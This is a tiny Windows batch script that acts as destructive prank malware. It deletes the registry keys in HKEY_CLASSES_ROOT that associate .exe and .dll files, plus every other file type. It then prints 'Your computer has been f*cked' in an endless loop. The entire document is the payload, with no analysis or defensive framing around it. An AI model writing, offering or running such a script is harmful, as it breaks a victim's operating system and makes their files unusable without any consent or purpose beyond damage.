@ECHO OFF
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*
:MESSAGE
ECHO Your computer has been f*cked. Have a nice day :)
GOTO MESSAGE
